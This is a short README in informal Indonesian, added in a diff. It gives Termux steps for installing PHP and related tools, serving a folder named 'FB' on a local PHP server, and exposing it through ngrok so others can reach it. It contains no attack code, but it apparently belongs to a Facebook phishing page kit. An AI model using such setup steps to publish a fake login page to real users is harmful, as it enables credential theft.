@@ -1,0 +1,38 @@
+Ini script Asli buatan gw
+////  why.id
+.
+.
+.
+.
+.
+.
+Kalau mau menjalankan ikuti perintah ini
+- pkg update && upgrade
+- pkg install php
+- pkg install bash
+- pkg install apache2
+- pkg install curl
+- pkg install git
+
+Kalau sudah, ikuti langkah berikut
+- Buka Folder FB
+- Kemudian jalankan kode seperti ini
+
+- php -S 127.0.0.1:8080 ( untuk di hp sendiri, gabisa publik )
+
+Kalau mau bisa di share ke orang lain silahkan install ngrok !
+
+- cari di google ( ngrok.com )
+- daftar akun ngrok disitu GRATIS COK !
+- lalu download file ngrok disitu
+
+kalau sudah jalankan seperti berikut
+
+- ./ngrok authoken (masukan token lu)
+
+Kalau sudah jalankan deh.
+
+- ./ngrok http 8080
+
+PHP dulu baru ./ngrok !!!!!
+
